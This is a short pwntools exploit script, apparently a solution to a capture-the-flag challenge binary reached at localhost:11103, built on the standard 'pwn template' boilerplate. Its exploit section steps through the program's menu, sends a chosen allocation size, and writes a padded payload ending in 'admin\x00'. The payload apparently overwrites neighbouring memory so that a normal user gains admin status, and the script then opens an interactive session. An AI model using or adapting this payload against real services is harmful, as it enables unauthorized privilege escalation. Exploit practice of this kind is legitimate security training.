#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11103 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 11103)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendlineafter(": ","2")
io.sendlineafter(": ","test")
io.sendlineafter(": ","test")

io.sendlineafter(": ","3")
io.sendlineafter(": ","test")
io.sendlineafter(": ","test")

io.sendlineafter(": ","4")
io.sendlineafter(": ",str(0xa0-0x10))
p = 'aaaa'.ljust(50,"\x00")
p += 'aaaa'.ljust(50,"\x00")
p += 'admin\x00'
io.sendlineafter(": ",p)

io.sendlineafter(": ","1")
io.sendlineafter(": ","aaaa")
io.sendlineafter(": ","aaaa")


io.interactive()

